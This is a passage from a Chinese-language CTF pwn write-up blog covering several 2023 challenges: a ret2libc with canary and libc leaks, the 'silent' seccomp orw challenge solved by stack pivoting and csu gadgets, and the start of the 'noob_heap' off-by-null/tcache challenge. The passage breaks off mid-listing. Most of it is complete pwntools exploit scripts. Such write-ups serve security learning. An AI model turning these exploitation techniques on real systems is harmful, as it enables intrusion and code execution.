src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-09-23_225025.png" alt=""></p><p>利用main泄露程序加载基址</p><p>利用libc_start_main泄露libc</p><p>常规处理,没有什么特殊的</p><p>最后所有流程都完成但运行无法正常getshell,猜测是栈不对齐,加一个ret即可</p><p><strong>exp:</strong>只适配了远程,但大致是这么个流程</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#from LibcSearcher import*</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">prdi=<span class="number">0x2a3e5</span></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;45.153.243.57&#x27;,1337)</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">code=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11c9</span></span><br><span class="line">puts_got=code+<span class="number">0x3fd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(code))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x80</span>-<span class="number">0x29dc0</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)+p64(<span class="number">0x1</span>)+p64(libc_base+prdi)+p64(libc_base+<span class="number">0x1d8698</span>)+p64(code+<span class="number">0x101a</span>)+p64(libc_base+<span class="number">0x050d60</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;133&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;133&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line"><span class="comment">#libc=puts_addr-0x84ed0</span></span><br><span class="line"><span class="comment">#one=libc+0xeeccc</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1337&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1024&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><p>首先是程序没有给定libc版本,</p><p>然后我运行的环境是ubuntu20,gdb提示需要glibc_234</p><p>当时直接以为程序原本就是glibc234了,但实际上这是最小需求,真正可能libc版本更高</p><p>所以在泄露libc时,就出现了远程<code>__libc_start_main-125</code>并不能找到对应的libc的情况</p><p>即e40-7d=dc3无对应libc,当时压根没想到libc_start_main的函数偏移不同</p><p>脑子短路了一阵</p><p>之后利用更改rbp使得puts泄露got加以确定libc基址才回过神来</p><hr><p><strong>小知识点:</strong></p><p><strong>libc中绝大部分函数地址是十六进制对齐,小部分是八进制对齐,极小部分是其他情况</strong></p><p><strong>因此当计算出的地址不是十六进制或八进制对齐基本可以认为是本地偏移与远程偏移有差</strong></p><p><strong>可以就近对齐十六进制或八进制尝试</strong></p><p>或者泄露其他函数对照</p><h1 id="2023鹏城杯-silent"><a href="#2023鹏城杯-silent" class="headerlink" title="2023鹏城杯-silent"></a>2023鹏城杯-silent</h1><p><strong>标签:栈溢出|ret2text?|rop|栈迁移</strong></p><p><strong>题目介绍:</strong></p><p>程序十分简短</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init_seccomp();</span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启了沙盒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/pwn$ seccomp-tools dump ./silent</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁止execve,只能orw了</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/silent&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>如果不是FULL RELRO可以考虑ret2dl</p><p>只能另作他解了</p><h3 id="解1"><a href="#解1" class="headerlink" title="解1:"></a>解1:</h3><p>解1是比赛时根据找到的一题非常像的题目的思路做的</p><p>简单来说就是栈迁移将栈迁移到bss段,然后调用_<em>libc_start_main去启动一段代码,于是\</em>_libc_start_main会在迁移后的栈上留下read+17的代码地址,在read等系统调用级的代码中一般都会有syscall</p><p>如下所示</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_221859.png" alt=""></p><p>不过如果用telescope这些查看的方式是找不到syscall的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_222054.png" alt=""></p><p>还是得用disassemble或者x去查看查找</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_222115.png" alt=""></p><p>可以找到这一段,可以视为syscall;ret</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-04_221835.png" alt=""></p><p>利用rop流将存储在栈中的read+17改为read+15便可以了</p><p>原理如上</p><p>实际利用过程中,选择采取重启read@plt表,毕竟其也属于代码段,而且刚好能更方便的利用__libc_start_main的参数</p><p>然后在libc_start_main启动read的时候把libc_start_main的返回栈修改为rop流接着进行orw</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;172.10.0.8&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b __libc_start_main&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15</span>):</span><br><span class="line">    pay = p64(<span class="number">0x40095A</span>)</span><br><span class="line">    pay += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    pay += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    pay += p64(r12) <span class="comment">#call_func</span></span><br><span class="line">    pay += p64(r13) <span class="comment">#edi</span></span><br><span class="line">    pay += p64(r14) <span class="comment">#rsi</span></span><br><span class="line">    pay += p64(r15) <span class="comment">#rdx</span></span><br><span class="line">    pay += p64(<span class="number">0x400940</span>)</span><br><span class="line">    pay += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"> </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x601100</span></span><br><span class="line">leave_ret = <span class="number">0x4008FC</span></span><br><span class="line">pop_rbp = <span class="number">0x400788</span></span><br><span class="line">ret=<span class="number">0x4008FD</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + csu(read_got,<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">0x580</span>)</span><br><span class="line">pay += p64(pop_rbp) + p64(bss+<span class="number">0x4f8</span>) + p64(leave_ret)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x601560</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x400</span>)</span><br><span class="line">payload +=csu(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],read_plt,<span class="number">0</span>,bss+<span class="number">0x478</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=csu(read_got,<span class="number">0</span>,syscall,<span class="number">1</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">0x2</span>)+ csu(syscall,bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=csu(read_got,<span class="number">3</span>,bss+<span class="number">0x420</span>,<span class="number">80</span>)+csu(read_got,<span class="number">0</span>,bss+<span class="number">0x700</span>,<span class="number">1</span>)+csu(syscall,<span class="number">1</span>,bss+<span class="number">0x420</span>,<span class="number">40</span>)<span class="comment">#orw</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x2f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;22&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>不过这种办法只能本地打通,远程似乎因为不是正常退出没有回显,又或者是flag的地址没有设对</p><h3 id="解2"><a href="#解2" class="headerlink" title="解2:"></a>解2:</h3><p>赛后其他人的解法</p><p>用到了一个之前完全没听说过的magic gadget来使得stdout改写为libc中gadget syscall;ret;</p><p>学到了,不过得有__do_global_dtors_aux这个函数才行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:  01 5d c3                add    DWORD PTR [rbp-0x3d],ebx</span><br><span class="line">3:  0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">8:  f3 c3                   repz ret</span><br></pre></td></tr></table></figure><p>然后利用libc_csu_init和read的返回数控制前三个参数和rax的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    <span class="comment"># p = process(name,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;172.10.0.8&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400963</span></span><br><span class="line">start = <span class="number">0x400720</span></span><br><span class="line">csu_1 = <span class="number">0x00000000040095A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov     rdx, r15</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r13d</span></span><br><span class="line"><span class="string">call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbp, rbx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">csu_2 = <span class="number">0x000000000400940</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">get_p(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line">bss = <span class="number">0x602100</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400876</span></span><br><span class="line">stdout = <span class="number">0x000000000601020</span></span><br><span class="line">op = <span class="number">0xffffffffffffffff</span> &amp; (<span class="number">0x00000000000d2625</span>-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">syscall = p64(csu_1) + p64(op) + p64(stdout+<span class="number">0x3d</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(bss-<span class="number">8</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span> + syscall</span><br><span class="line"></span><br><span class="line">payload += p64(csu_1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(stdout) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(stdout) + p64(<span class="number">1</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x40</span>) + p64(csu_2)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>只能说不愧是大佬,见多识广有经验</p><h1 id="2023第六届强网拟态-noob-heap"><a href="#2023第六届强网拟态-noob-heap" class="headerlink" title="2023第六届强网拟态- noob_heap"></a>2023第六届强网拟态- noob_heap</h1><p><strong>标签:off-by-null|malloc_consolidate|rop|栈迁移|unlink|tcache attack</strong></p><p><strong>题目介绍:</strong>noob_heap</p><p>checksec</p><figure class="highlight plaintext"><figcaption><span>'/home/aichch/pwn/nb'</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开,还有沙盒,禁掉了execve,目标是orw</p><p>glibc是2.35,算是高版本了</p><p>程序实现就是老四样:增删查改</p><p>其中edit存在off by null</p><p>让人比较难受的一个点是malloc申请的size只能处于0x20到0x80</p><p>这也就是说chunk正常情况下是不会被放到unsorted中的,而2.32往上的版本的fastbin和tcachebin都是加密过的,也就是说无法泄露堆和libc</p><p>这里就需要用到一个知识点:</p><p><strong>scanf读取数字时发送一个非常长的数字字符串会触发malloc和free</strong>,申请的chunk大小为0x810处于largebin,会触发malloc_consolidate处理fastbin</p><p>那么最终流程如下:</p><ol><li>申请足够的chunk,并释放使其有足够的数量被放入fastbin,这里申请时就要为之后的fake chunk做一些铺垫,提前写上一些东西</li><li>利用sacnf触发malloc_consolidate,使fastbin合并并加入smallbin称为C0</li><li>申请chunk泄露libc和heap</li><li>从合并后的chunk中切出一部分C1,off by null覆盖掉剩余部分的size</li><li>free C1前面的chunk,使得C1进行unlink,并最终造成堆块堆叠</li><li>再将堆叠后的chunk的C1部分取出作为C2,现在可以uaf进行tcache攻击了</li><li>tache attack取出environ符号,获得栈地址</li><li>再tcache attack取出返回栈,进行rop构造,因为可写栈有限,所以可以栈迁移到堆上,之后无论是再次栈迁移,还是利用setcontext都可行</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span 